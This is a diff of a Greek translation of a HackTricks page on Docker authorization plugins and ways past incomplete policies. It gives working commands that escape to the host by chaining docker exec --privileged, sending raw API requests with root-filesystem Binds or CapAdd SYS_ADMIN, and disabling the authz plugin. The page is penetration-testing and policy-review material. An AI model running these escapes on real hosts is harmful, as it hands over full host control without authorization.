@@ -1,128 +1,148 @@
-# Runtime Authorization Plugins
+# Πρόσθετα εξουσιοδότησης χρόνου εκτέλεσης
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Επισκόπηση
 
-Τα runtime authorization plugins είναι ένα επιπλέον επίπεδο policy που αποφασίζει αν ένας caller μπορεί να εκτελέσει μια συγκεκριμένη ενέργεια του daemon. Το Docker είναι το κλασικό παράδειγμα. Από προεπιλογή, όποιος μπορεί να επικοινωνήσει με το Docker daemon έχει ουσιαστικά ευρύ έλεγχο πάνω του. Τα authorization plugins προσπαθούν να περιορίσουν αυτό το μοντέλο εξετάζοντας τον authenticated χρήστη και την API operation που ζητήθηκε και, στη συνέχεια, επιτρέποντας ή απορρίπτοντας το request σύμφωνα με την policy.
+Τα πρόσθετα εξουσιοδότησης χρόνου εκτέλεσης αποτελούν ένα επιπλέον επίπεδο πολιτικής, το οποίο αποφασίζει αν ένας καλών μπορεί να εκτελέσει μια συγκεκριμένη ενέργεια του daemon. Το Docker είναι το κλασικό παράδειγμα. Από προεπιλογή, όποιος μπορεί να επικοινωνήσει με τον daemon του Docker έχει ουσιαστικά ευρύ έλεγχο πάνω του. Τα πρόσθετα εξουσιοδότησης προσπαθούν να περιορίσουν αυτό το μοντέλο εξετάζοντας τον πιστοποιημένο χρήστη και τη ζητούμενη λειτουργία API και, στη συνέχεια, επιτρέποντας ή απορρίπτοντας το αίτημα σύμφωνα με την πολιτική.
 
-Αυτό το θέμα αξίζει τη δική του σελίδα, επειδή αλλάζει το exploitation model όταν ένας attacker έχει ήδη πρόσβαση σε Docker API ή σε χρήστη της ομάδας `docker`. Σε τέτοια περιβάλλοντα, το ερώτημα δεν είναι πλέον μόνο «μπορώ να φτάσω στο daemon;», αλλά και «προστατεύεται το daemon από authorization layer και, αν ναι, μπορεί αυτό το layer να παρακαμφθεί μέσω endpoints που δεν έχουν υποστηριχθεί, αδύναμου JSON parsing ή permissions για plugin management;»
+Αυτό το θέμα αξίζει τη δική του σελίδα, επειδή αλλάζει το μοντέλο εκμετάλλευσης όταν ένας attacker έχει ήδη πρόσβαση σε ένα Docker API ή σε χρήστη της ομάδας `docker`. Σε τέτοια περιβάλλοντα, το ερώτημα δεν είναι πλέον μόνο «μπορώ να φτάσω στον daemon;», αλλά και «προστατεύεται ο daemon από ένα επίπεδο εξουσιοδότησης και, αν ναι, μπορεί να παρακαμφθεί αυτό το επίπεδο μέσω endpoints που δεν έχουν καλυφθεί, αδύναμης ανάλυσης JSON ή δικαιωμάτων διαχείρισης πρόσθετων;»
 
 ## Λειτουργία
 
-Όταν ένα request φτάνει στο Docker daemon, το authorization subsystem μπορεί να προωθήσει το context του request σε ένα ή περισσότερα εγκατεστημένα plugins. Το plugin βλέπει την ταυτότητα του authenticated χρήστη, τις λεπτομέρειες του request, επιλεγμένα headers και τμήματα του request ή του response body όταν το content type είναι κατάλληλο. Μπορούν να συνδεθούν πολλαπλά plugins σε chain και η πρόσβαση επιτρέπεται μόνο αν όλα τα plugins εγκρίνουν το request.
+Όταν ένα αίτημα φτάσει στον daemon του Docker, το υποσύστημα εξουσιοδότησης μπορεί να μεταβιβάσει το περιβάλλον του αιτήματος σε ένα ή περισσότερα εγκατεστημένα πρόσθετα. Το πρόσθετο βλέπει την ταυτότητα του πιστοποιημένου χρήστη, τις λεπτομέρειες του αιτήματος, επιλεγμένες κεφαλίδες και τμήματα του σώματος του αιτήματος ή της απόκρισης, όταν ο τύπος περιεχομένου είναι κατάλληλος. Μπορούν να συνδεθούν διαδοχικά πολλά πρόσθετα και η πρόσβαση παραχωρείται μόνο αν όλα επιτρέψουν το αίτημα.
 
-Αυτό το μοντέλο φαίνεται ισχυρό, αλλά η ασφάλειά του εξαρτάται πλήρως από το πόσο ολοκληρωμένα έχει κατανοήσει ο author της policy το API. Ένα plugin που αποκλείει το `docker run --privileged`, αλλά αγνοεί το `docker exec`, παραλείπει εναλλακτικά JSON keys όπως το top-level `Binds` ή επιτρέπει τη διαχείριση plugins, μπορεί να δημιουργήσει μια ψευδή αίσθηση περιορισμού, αφήνοντας ταυτόχρονα ανοιχτές άμεσες διαδρομές privilege-escalation.
+Αυτό το μοντέλο ακούγεται ισχυρό, αλλά η ασφάλειά του εξαρτάται εξ ολοκλήρου από το πόσο καλά έχει κατανοήσει ο συντάκτης της πολιτικής το API. Ένα πρόσθετο που αποκλείει το `docker run --privileged`, αλλά αγνοεί το `docker exec`, παραβλέπει εναλλακτικά κλειδιά JSON όπως το ανώτατου επιπέδου `Binds` ή επιτρέπει τη διαχείριση πρόσθετων, μπορεί να δημιουργήσει μια ψευδή αίσθηση περιορισμού, αφήνοντας παράλληλα ανοιχτούς άμεσους δρόμους κλιμάκωσης προνομίων.
 
-## Συνήθεις Στόχοι Plugins
+## Συνήθεις στόχοι πρόσθετων
 
-Σημαντικές περιοχές για policy review είναι:
+Σημαντικοί τομείς για τον έλεγχο της πολιτικής είναι:
 
 - endpoints δημιουργίας containers
-- πεδία του `HostConfig`, όπως `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` και επιλογές namespace-sharing
-- η συμπεριφορά του `docker exec`
-- endpoints διαχείρισης plugins
-- οποιοδήποτε endpoint μπορεί να ενεργοποιήσει έμμεσα runtime actions εκτός του intended policy model
+- πεδία `HostConfig`, όπως τα `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` και οι επιλογές κοινής χρήσης namespaces
+- συμπεριφορά του `docker exec`
+- endpoints διαχείρισης πρόσθετων
+- κάθε endpoint που μπορεί έμμεσα να ενεργοποιήσει ενέργειες του runtime εκτός του προβλεπόμενου μοντέλου πολιτικής
 
-Ιστορικά, παραδείγματα όπως το `authz` plugin της Twistlock και απλά εκπαιδευτικά plugins όπως το `authobot` έκαναν αυτό το μοντέλο εύκολο στη μελέτη, επειδή τα policy files και τα code paths τους έδειχναν πώς υλοποιούνταν στην πράξη το endpoint-to-action mapping. Για εργασίες assessment, το σημαντικό μάθημα είναι ότι ο author της policy πρέπει να κατανοεί ολόκληρο το API surface και όχι μόνο τις πιο εμφανείς CLI commands.
+Ιστορικά, παραδείγματα όπως το πρόσθετο `authz` της Twistlock και απλά εκπαιδευτικά πρόσθετα όπως το `authobot` έκαναν εύκολη τη μελέτη αυτού του μοντέλου, επειδή τα αρχεία πολιτικής τους και οι διαδρομές κώδικα έδειχναν πώς υλοποιούνταν στην πράξη η αντιστοίχιση endpoint σε ενέργεια. Για εργασίες αξιολόγησης, το σημαντικό δίδαγμα είναι ότι ο συντάκτης της πολιτικής πρέπει να κατανοεί ολόκληρη την επιφάνεια του API και όχι μόνο τις πιο εμφανείς εντολές CLI.
 
 ## Κατάχρηση
 
-Ο πρώτος στόχος είναι να μάθεις τι πραγματικά αποκλείεται. Αν το daemon απορρίψει μια ενέργεια, το error συχνά κάνει leak το όνομα του plugin, κάτι που βοηθά στον εντοπισμό του control που χρησιμοποιείται:
+Ο πρώτος στόχος είναι να μάθουμε τι ακριβώς αποκλείεται. Αν ο daemon απορρίψει μια ενέργεια, το σφάλμα συχνά κάνει leak το όνομα του πρόσθετου, κάτι που βοηθά στον εντοπισμό του μηχανισμού ελέγχου που χρησιμοποιείται:
+
 ```bash
 docker ps
 docker run --rm -it --privileged ubuntu:24.04 bash
 docker plugin ls
 ```
-Αν χρειάζεστε ευρύτερο endpoint profiling, εργαλεία όπως το `docker_auth_profiler` είναι χρήσιμα, επειδή αυτοματοποιούν τη διαφορετικά επαναλαμβανόμενη εργασία ελέγχου των API routes και των JSON structures που επιτρέπονται πραγματικά από το plugin.
 
-Αν το περιβάλλον χρησιμοποιεί custom plugin και μπορείτε να αλληλεπιδράσετε με το API, απαριθμήστε ποια object fields φιλτράρονται πραγματικά:
+Αν χρειάζεστε ευρύτερη αποτύπωση των endpoints, εργαλεία όπως το `docker_auth_profiler` είναι χρήσιμα, καθώς αυτοματοποιούν την κατά τα άλλα επαναλαμβανόμενη διαδικασία ελέγχου των διαδρομών API και των δομών JSON που επιτρέπει πράγματι το plugin.
+
+Αν το περιβάλλον χρησιμοποιεί προσαρμοσμένο plugin και μπορείτε να αλληλεπιδράσετε με το API, καταγράψτε ποια πεδία αντικειμένων φιλτράρονται πράγματι:
+
 ```bash
 docker version
 docker inspect <container> 2>/dev/null | head
 curl --unix-socket /var/run/docker.sock http:/version
 curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
 ```
-Αυτοί οι έλεγχοι είναι σημαντικοί, επειδή πολλές αποτυχίες authorization αφορούν συγκεκριμένα πεδία και όχι την έννοια συνολικά. Ένα plugin μπορεί να απορρίψει ένα μοτίβο CLI χωρίς να αποκλείσει πλήρως την ισοδύναμη δομή API.
 
-### Πλήρες παράδειγμα: Το `docker exec` προσθέτει privilege μετά τη δημιουργία του container
+Αυτοί οι έλεγχοι είναι σημαντικοί, επειδή πολλές αποτυχίες εξουσιοδότησης αφορούν συγκεκριμένα πεδία και όχι συγκεκριμένες έννοιες. Ένα plugin μπορεί να απορρίπτει ένα μοτίβο CLI χωρίς να αποκλείει πλήρως την ισοδύναμη δομή API.
 
-Μια policy που αποκλείει τη δημιουργία privileged container, αλλά επιτρέπει τη δημιουργία unconfined container σε συνδυασμό με `docker exec`, μπορεί και πάλι να παρακαμφθεί:
+### Πλήρες παράδειγμα: Το `docker exec` προσθέτει προνόμια μετά τη δημιουργία του container
+
+Μια πολιτική που αποκλείει τη δημιουργία privileged container, αλλά επιτρέπει τη δημιουργία unconfined container σε συνδυασμό με το `docker exec`, μπορεί και πάλι να παρακαμφθεί:
+
 ```bash
 docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
 docker ps
 docker exec -it --privileged <container_id> bash
 ```
-Εάν ο daemon αποδεχτεί το δεύτερο βήμα, ο χρήστης έχει ανακτήσει μια προνομιούχα interactive διεργασία μέσα σε ένα container που ο συγγραφέας της policy πίστευε ότι ήταν περιορισμένο.
 
-### Πλήρες Παράδειγμα: Bind Mount Μέσω Raw API
+Αν ο daemon αποδεχτεί το δεύτερο βήμα, ο χρήστης έχει αποκτήσει μια προνομιούχα διαδραστική διεργασία μέσα σε container που ο συντάκτης της πολιτικής πίστευε ότι ήταν περιορισμένο.
 
-Ορισμένες ελαττωματικές policies ελέγχουν μόνο μία μορφή JSON. Εάν το bind mount του root filesystem δεν αποκλείεται με συνέπεια, το host μπορεί και πάλι να γίνει mount:
+Ένας περιοριστικός κανόνας `sudo` μπορεί να εκθέσει την ίδια διαδρομή ακόμη κι όταν ο καλών δεν έχει άμεση πρόσβαση στο Docker socket. Για παράδειγμα, μια παραχώρηση δικαιωμάτων για εκτέλεση ως root του `/usr/bin/docker exec *` μπορεί να επιτρέψει στον καλούντα να δώσει τις επιλογές Docker `--privileged` και `--user root`. Εξακολουθεί να απαιτείται ένα container σε λειτουργία· σε ορισμένους Linux hosts, το ID του είναι ορατό στη γραμμή εντολών μιας διεργασίας `containerd-shim`, όταν απαγορεύεται η χρήση του `docker ps`. Αντιμετωπίστε τον κανόνα ως στοιχείο προς διερεύνηση: επιβεβαιώστε την ισχύουσα πολιτική sudo, τους ελέγχους εξουσιοδότησης του daemon, τα user namespaces και αν η διεργασία που προκύπτει μπορεί να αποκτήσει πρόσβαση σε συσκευή του host ή σε εγγράψιμο mount του host. Το Docker τεκμηριώνει τις επιλογές exec στην [αναφορά CLI](https://docs.docker.com/reference/cli/docker/container/exec/).
+
+Ένα wrapper που εκτελείται ως root και δέχεται αρχείο Compose που επιλέγει ο καλών πρέπει να επικυρώνει ολόκληρο το [μοντέλο υπηρεσιών Compose](https://docs.docker.com/reference/compose-file/services/), όχι απλώς να απορρίπτει το `privileged: true` και να απαιτεί `:ro` στα bind mounts. Ελέγξτε τα `cap_add`, `security_opt`, τις συσκευές, τα namespaces, τις εισόδους build και κάθε υποστηριζόμενη σύνταξη volume. Ένα read-only bind mount ενδέχεται και πάλι να γίνει εγγράψιμο από το εσωτερικό ενός container με κατάλληλες δυνατότητες και χαλαρούς περιορισμούς ασφαλείας, ανάλογα με την πολιτική του daemon και του kernel. Χρειάζεται επίσης έλεγχος στις λίστες επιτρεπόμενων διαδρομών host που βασίζονται μόνο σε πρόθεμα, καθώς και στους ελέγχους symlink που εξετάζουν μόνο το τελικό στοιχείο της διαδρομής. Ένας κανόνας sudo και μια κυριολεκτική κλήση `docker-compose up` υποδεικνύουν μια πιθανή περίπτωση· το αν είναι εκμεταλλεύσιμη εξαρτάται από την πραγματική επικύρωση του wrapper και τους περιορισμούς του daemon κατά την εκτέλεση.
+
+### Πλήρες Παράδειγμα: Bind Mount μέσω Raw API
+
+Ορισμένες εσφαλμένες πολιτικές ελέγχουν μόνο μία μορφή JSON. Αν το bind mount του root filesystem δεν αποκλείεται με συνέπεια, ο host μπορεί και πάλι να προσαρτηθεί:
+
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock \
--H "Content-Type: application/json" \
--d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
-http:/v1.41/containers/create
+  -H "Content-Type: application/json" \
+  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
+  http:/v1.41/containers/create
 docker start <container_id>
 docker exec -it <container_id> chroot /host /bin/bash
 ```
+
 Η ίδια ιδέα μπορεί επίσης να εμφανίζεται στο `HostConfig`:
+
 ```bash
 curl --unix-socket /var/run/docker.sock \
--H "Content-Type: application/json" \
--d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
-http:/v1.41/containers/create
+  -H "Content-Type: application/json" \
+  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
+  http:/v1.41/containers/create
 ```
-Ο αντίκτυπος είναι πλήρης διαφυγή από το filesystem του host. Η ενδιαφέρουσα λεπτομέρεια είναι ότι το bypass προκύπτει από ελλιπή κάλυψη της policy και όχι από bug του kernel.
 
-### Πλήρες παράδειγμα: Μη ελεγμένο Capability Attribute
+Ο αντίκτυπος είναι πλήρης διαφυγή από το filesystem του host. Η ενδιαφέρουσα λεπτομέρεια είναι ότι το bypass οφείλεται σε ελλιπή κάλυψη της πολιτικής και όχι σε σφάλμα του kernel.
 
-Αν η policy παραλείψει να φιλτράρει ένα attribute που σχετίζεται με capability, ο attacker μπορεί να δημιουργήσει ένα container που ανακτά μια επικίνδυνη capability:
+### Πλήρες Παράδειγμα: Μη ελεγμένο Attribute Capability
+
+Αν η πολιτική ξεχάσει να φιλτράρει ένα attribute που σχετίζεται με το capability, ο επιτιθέμενος μπορεί να δημιουργήσει ένα container που ανακτά ένα επικίνδυνο capability:
+
 ```bash
 curl --unix-socket /var/run/docker.sock \
--H "Content-Type: application/json" \
--d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
-http:/v1.41/containers/create
+  -H "Content-Type: application/json" \
+  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
+  http:/v1.41/containers/create
 docker start <container_id>
 docker exec -it <container_id> bash
 capsh --print
 ```
-Μόλις υπάρχει το `CAP_SYS_ADMIN` ή μια αντίστοιχα ισχυρή capability, γίνονται προσβάσιμες πολλές τεχνικές breakout που περιγράφονται στα [capabilities.md](protections/capabilities.md) και [privileged-containers.md](privileged-containers.md).
+
+Μόλις υπάρχει `CAP_SYS_ADMIN` ή μια εξίσου ισχυρή capability, γίνονται εφικτές πολλές τεχνικές breakout που περιγράφονται στα [capabilities.md](protections/capabilities.md) και [privileged-containers.md](privileged-containers.md).
 
 ### Πλήρες παράδειγμα: Απενεργοποίηση του Plugin
 
-Εάν επιτρέπονται operations διαχείρισης plugin, το καθαρότερο bypass μπορεί να είναι η πλήρης απενεργοποίηση του ελέγχου:
+Αν επιτρέπονται λειτουργίες διαχείρισης plugin, η πιο καθαρή παράκαμψη μπορεί να είναι η πλήρης απενεργοποίηση του ελέγχου:
+
 ```bash
 docker plugin ls
 docker plugin disable <plugin_name>
 docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
 docker plugin enable <plugin_name>
 ```
-Πρόκειται για αποτυχία πολιτικής σε επίπεδο control-plane. Το authorization layer υπάρχει, αλλά ο χρήστης του οποίου την πρόσβαση υποτίθεται ότι θα περιόριζε εξακολουθεί να έχει δικαίωμα να το απενεργοποιεί.
+
+Πρόκειται για αποτυχία πολιτικής στο επίπεδο του control plane. Το επίπεδο εξουσιοδότησης υπάρχει, αλλά ο χρήστης που υποτίθεται ότι θα περιόριζε εξακολουθεί να έχει δικαίωμα να το απενεργοποιήσει.
 
 ## Έλεγχοι
 
-Αυτές οι εντολές αποσκοπούν στον εντοπισμό του κατά πόσο υπάρχει policy layer και κατά πόσο φαίνεται να είναι πλήρες ή επιφανειακό.
+Αυτές οι εντολές έχουν στόχο να εντοπίσουν αν υπάρχει επίπεδο πολιτικής και αν φαίνεται ολοκληρωμένο ή επιφανειακό.
+
 ```bash
 docker plugin ls
 docker info 2>/dev/null | grep -i authorization
 docker run --rm -it --privileged ubuntu:24.04 bash
 curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
 ```
+
 Τι είναι ενδιαφέρον εδώ:
 
-- Μηνύματα άρνησης που περιλαμβάνουν το όνομα ενός plugin επιβεβαιώνουν την ύπαρξη authorization layer και συχνά αποκαλύπτουν την ακριβή υλοποίηση.
-- Μια λίστα plugin που είναι ορατή στον attacker μπορεί να αρκεί για να διαπιστωθεί αν είναι δυνατές οι ενέργειες disable ή reconfigure.
-- Μια policy που μπλοκάρει μόνο τις προφανείς ενέργειες CLI, αλλά όχι τα raw API requests, θα πρέπει να θεωρείται bypassable μέχρι να αποδειχθεί το αντίθετο.
+- Τα μηνύματα άρνησης που περιλαμβάνουν το όνομα ενός plugin επιβεβαιώνουν την ύπαρξη ενός επιπέδου εξουσιοδότησης και συχνά αποκαλύπτουν την ακριβή υλοποίηση.
+- Μια λίστα plugin ορατή στον attacker μπορεί να αρκεί για να διαπιστωθεί αν είναι δυνατές λειτουργίες απενεργοποίησης ή αναδιαμόρφωσης.
+- Μια πολιτική που αποκλείει μόνο προφανείς ενέργειες CLI, αλλά όχι ακατέργαστα αιτήματα API, πρέπει να θεωρείται παρακάμψιμη μέχρι να αποδειχθεί το αντίθετο.
 
-## Προεπιλογές Runtime
+## Προεπιλογές runtime
 
-| Runtime / platform | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθης χειροκίνητη αποδυνάμωση |
+| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθεις χειροκίνητες αποδυναμώσεις |
 | --- | --- | --- | --- |
-| Docker Engine | Δεν είναι ενεργοποιημένο από προεπιλογή | Η πρόσβαση στον daemon είναι ουσιαστικά all-or-nothing, εκτός αν έχει ρυθμιστεί authorization plugin | incomplete plugin policy, blacklists αντί για allowlists, allowing plugin management, field-level blind spots |
-| Podman | Δεν υπάρχει κοινό άμεσο ισοδύναμο | Το Podman συνήθως βασίζεται περισσότερο σε Unix permissions, rootless execution και αποφάσεις σχετικά με την έκθεση του API, παρά σε authz plugins τύπου Docker | exposing a rootful Podman API broadly, weak socket permissions |
-| containerd / CRI-O | Διαφορετικό control model | Αυτά τα runtimes συνήθως βασίζονται σε socket permissions, node trust boundaries και controls του orchestrator σε ανώτερο επίπεδο, αντί για Docker authz plugins | mounting the socket into workloads, weak node-local trust assumptions |
-| Kubernetes | Χρησιμοποιεί authn/authz στα επίπεδα του API-server και του kubelet, όχι Docker authz plugins | Τα cluster RBAC και admission controls αποτελούν το κύριο policy layer | overbroad RBAC, weak admission policy, exposing kubelet or runtime APIs directly |
+| Docker Engine | Δεν είναι ενεργοποιημένο από προεπιλογή | Η πρόσβαση στον daemon είναι ουσιαστικά συνολική ή ανύπαρκτη, εκτός αν έχει ρυθμιστεί authorization plugin | ελλιπής πολιτική plugin, blacklists αντί για allowlists, δυνατότητα διαχείρισης plugin, τυφλά σημεία σε επίπεδο πεδίων |
+| Podman | Δεν υπάρχει κοινό άμεσο ισοδύναμο | Το Podman βασίζεται συνήθως περισσότερο σε δικαιώματα Unix, rootless εκτέλεση και αποφάσεις σχετικά με την έκθεση του API παρά σε authz plugins τύπου Docker | ευρεία έκθεση ενός rootful Podman API, αδύναμα δικαιώματα socket |
+| containerd / CRI-O | Διαφορετικό μοντέλο ελέγχου | Αυτά τα runtimes βασίζονται συνήθως σε δικαιώματα socket, όρια εμπιστοσύνης κόμβων και ελέγχους σε ανώτερα επίπεδα του orchestrator, αντί για authz plugins του Docker | προσάρτηση του socket σε workloads, αδύναμες τοπικές παραδοχές εμπιστοσύνης στον κόμβο |
+| Kubernetes | Χρησιμοποιεί authn/authz στα επίπεδα API-server και kubelet, όχι authz plugins του Docker | Τα cluster RBAC και τα admission controls αποτελούν το κύριο επίπεδο πολιτικής | υπερβολικά ευρεία RBAC, αδύναμη πολιτική admission, άμεση έκθεση των API του kubelet ή του runtime |
 
 {{#include ../../../banners/hacktricks-training.md}}
